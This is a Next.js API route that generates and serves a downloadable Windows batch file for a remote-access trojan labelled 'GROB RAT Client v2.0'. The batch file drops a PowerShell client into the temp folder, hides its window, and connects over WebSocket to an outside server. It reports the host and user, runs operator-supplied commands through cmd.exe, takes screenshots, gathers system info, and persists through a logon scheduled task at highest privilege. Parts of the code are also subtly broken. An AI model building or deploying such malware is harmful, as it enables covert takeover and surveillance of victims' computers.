import { NextResponse } from "next/server"
import * as fs from "fs"
import * as path from "path"
import * as crypto from "crypto"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const hideDesktopIcon = formData.get("hideDesktopIcon") === "true"
    const autoStartup = formData.get("autoStartup") === "true"
    const userUid = formData.get("userUid") as string

    if (!userUid || userUid === "null" || !userUid.trim()) {
      return NextResponse.json({ error: "UID is required", details: "Please re-login" }, { status: 400 })
    }

    const randomName = crypto.randomBytes(8).toString("hex")
    const clientFileName = `client_${randomName}`

    // Create DEBUG standalone batch file
    const batchContent = `@echo off
title GROB Client Setup
color 0A
echo.
echo ====================================
echo       GROB RAT Client v2.0
echo ====================================
echo.
echo [+] Server: wss://glistening-mindfulness.up.railway.app
echo [+] User ID: ${userUid}
echo [+] Auto-startup: ${autoStartup ? "Enabled" : "Disabled"}
echo [+] Hidden mode: ${hideDesktopIcon ? "Enabled" : "Disabled"}
echo.

:: Create working directory
if not exist "%TEMP%\\GROB" mkdir "%TEMP%\\GROB"
cd /d "%TEMP%\\GROB"

:: Create debug PowerShell client
echo [+] Creating PowerShell client...
powershell -Command "& {
    # GROB RAT PowerShell Client v2.0 - DEBUG VERSION
    param(
        [string]$ServerUrl = 'wss://glistening-mindfulness.up.railway.app',
        [string]$UserId = '${userUid}',
        [bool]$AutoStartup = $$${autoStartup},
        [bool]$Hidden = $$${hideDesktopIcon}
    )

    Write-Host '[+] Starting GROB Client...'
    Write-Host '[+] Server:' $ServerUrl
    Write-Host '[+] User ID:' $UserId
    Write-Host '[+] Auto-startup:' $AutoStartup
    Write-Host '[+] Hidden mode:' $Hidden

    # Hide PowerShell window if hidden mode
    if ($$Hidden) {
        $$Async = '[DllImport(\\"user32.dll\\")]public static extern bool ShowWindow(IntPtr handle, int nCmdShow);'
        $$Type = Add-Type -MemberDefinition $$Async -Name \\"Win32\\" -PassThru
        $$Type::ShowWindow((Get-Process -Id $$PID).MainWindowHandle, 0)
    }

    # Test WebSocket connection
    Write-Host '[+] Testing WebSocket connection...'
    try {
        $$WS = New-Object System.Net.WebSockets.ClientWebSocket
        $$CT = New-Object System.Threading.CancellationTokenSource
        $$Buffer = New-Object byte[] 4096
        
        Write-Host '[+] Connecting to:' $ServerUrl
        $$WS.ConnectAsync($ServerUrl, $$CT.Token).Wait()
        Write-Host '[+] WebSocket connected successfully!'
        
        # Send initial connection with user ID
        $$Auth = @{
            type = 'auth'
            uid = $UserId
            pc_info = @{
                hostname = $$env:COMPUTERNAME
                username = $$env:USERNAME
                os = 'Windows ' + [System.Environment]::OSVersion.Version.Major + '.' + [System.Environment]::OSVersion.Version.Minor
                ip = 'offline'
                timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            }
        } | ConvertTo-Json -Compress
        
        $$AuthBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Auth)
        $$WS.SendAsync($$AuthBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
        Write-Host '[+] Auth data sent!'
        
        # Listen for commands
        while ($$WS.State -eq 'Open') {
            try {
                $$Result = $$WS.ReceiveAsync($$Buffer, $$CT.Token)
                if ($$Result.Result -eq 'Close') { 
                    Write-Host '[+] Connection closed by server'
                    break 
                }
                
                $$Message = [System.Text.Encoding]::UTF8.GetString($$Buffer, 0, $$Result.Count)
                Write-Host '[+] Received message:' $$Message
                
                # Send heartbeat every 30 seconds
                if ($$Message -like '*heartbeat*') {
                    $$Heartbeat = @{
                        type = 'heartbeat'
                        uid = $UserId
                        timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                    } | ConvertTo-Json -Compress
                    
                    $$HeartbeatBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Heartbeat)
                    $$WS.SendAsync($$HeartbeatBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
                    continue
                }
                
                $$Command = $$Message | ConvertFrom-Json
                Write-Host '[+] Processing command:' $$Command.type
                
                switch ($$Command.type) {
                    'screenshot' {
                        Write-Host '[+] Taking screenshot...'
                        Take-Screenshot
                    }
                    'cmd' {
                        Write-Host '[+] Executing command:' $$Command.cmd
                        Execute-Command -Command $$Command.cmd
                    }
                    'info' {
                        Write-Host '[+] Getting system info...'
                        Get-SystemInfo
                    }
                    'files' {
                        Write-Host '[+] Getting files...'
                        Get-Files -Path $$Command.path
                    }
                    default {
                        Write-Host '[+] Unknown command:' $$Command.type
                    }
                }
            } catch {
                Write-Host '[-] Error processing command:' $$_
            }
        }
    } catch {
        Write-Host '[-] WebSocket connection failed:' $$_
        Write-Host '[-] Error details:' $($_.Exception.Message)
        
        # Try to get more error info
        if ($$_ -and $$_Exception) {
            Write-Host '[-] Exception type:' $($_.Exception.GetType().Name)
            Write-Host '[-] Stack trace:' $($_.Exception.StackTrace)
        }
    } finally {
        if ($$WS) { 
            Write-Host '[+] Cleaning up WebSocket'
            $$WS.Dispose() 
        }
        if ($$CT) { 
            Write-Host '[+] Cleaning up cancellation token'
            $$CT.Dispose() 
        }
    }

    function Take-Screenshot {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            
            $$Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $$Bitmap = New-Object System.Drawing.Bitmap $$Bounds.Width, $$Bounds.Height
            $$Graphics = [System.Drawing.Graphics]::FromImage($$Bitmap)
            $$Graphics.CopyFromScreen($$Bounds.Location, [System.Drawing.Point]::Empty, $$Bounds.Size)
            
            $$ScreenshotPath = \\"$$env:TEMP\\\\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png\\"
            $$Bitmap.Save($$ScreenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
            $$Graphics.Dispose()
            $$Bitmap.Dispose()
            
            Write-Host '[+] Screenshot saved:' $$ScreenshotPath
            
            # Send screenshot info back
            $$ScreenshotData = @{
                type = 'screenshot_result'
                path = $$ScreenshotPath
                uid = $UserId
            } | ConvertTo-Json -Compress
            
            $$ScreenshotBuffer = [System.Text.Encoding]::UTF8.GetBytes($$ScreenshotData)
            $$WS.SendAsync($$ScreenshotBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
        } catch {
            Write-Host '[-] Screenshot error:' $$_
        }
    }

    function Execute-Command {
        param([string]$$Command)
        try {
            $$Output = cmd.exe /c $$Command 2>&1 | Out-String
            Write-Host '[+] Command executed:' $$Command
            Write-Host '[+] Output:' $$Output
            
            # Send command result back
            $$CmdResult = @{
                type = 'cmd_result'
                command = $$Command
                output = $$Output
                uid = $UserId
            } | ConvertTo-Json -Compress
            
            $$CmdBuffer = [System.Text.Encoding]::UTF8.GetBytes($$CmdResult)
            $$WS.SendAsync($$CmdBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
        } catch {
            Write-Host '[-] Command error:' $$_
        }
    }

    function Get-SystemInfo {
        try {
            $$Info = @{
                type = 'system_info'
                hostname = $$env:COMPUTERNAME
                username = $$env:USERNAME
                os = 'Windows ' + [System.Environment]::OSVersion.Version.Major + '.' + [System.Environment]::OSVersion.Version.Minor
                architecture = $$env:PROCESSOR_ARCHITECTURE
                domain = $$env:USERDOMAIN
                drives = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | ConvertTo-Json -Compress
                uid = $UserId
            } | ConvertTo-Json -Compress
            
            $$InfoBuffer = [System.Text.Encoding]::UTF8.GetBytes($$Info)
            $$WS.SendAsync($$InfoBuffer, [System.Net.WebSockets.WebSocketMessageType.Text, $$true, $$CT.Token).Wait()
        } catch {
            Write-Host '[-] System info error:' $$_
        }
    }
}" | Out-File -FilePath "client.ps1" -Encoding UTF8

:: Execute PowerShell client
echo [+] Starting client...
powershell -ExecutionPolicy Bypass -File "client.ps1"

:: Auto-startup setup
if "${autoStartup}"=="true" (
    echo [+] Setting up auto-startup...
    powershell -Command "Register-ScheduledTask -TaskName 'GROBClient' -Trigger 'AtLogOn' -Action 'PowerShell -ExecutionPolicy Bypass -File \\"%TEMP%\\GROB\\client.ps1\\"' -RunLevel Highest -Force"
)

echo.
echo [✓] Client started successfully!
echo [✓] Check your admin panel for connection
echo.
timeout /t 3 >nul
exit
`

    const tempDir = path.join(process.cwd(), "dist_temp")
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true })
    }

    const batchFile = path.join(tempDir, `${clientFileName}.bat`)
    fs.writeFileSync(batchFile, batchContent)

    // Read batch file
    const batchBuffer = fs.readFileSync(batchFile)

    // Cleanup
    try {
      fs.rmSync(tempDir, { recursive: true, force: true })
    } catch {}

    return new NextResponse(batchBuffer, {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="${clientFileName}.bat"`,
      },
    })

  } catch (error: any) {
    console.error("Standalone builder error:", error)
    return NextResponse.json(
      { error: "Failed to create standalone client", details: error.message },
      { status: 500 }
    )
  }
}
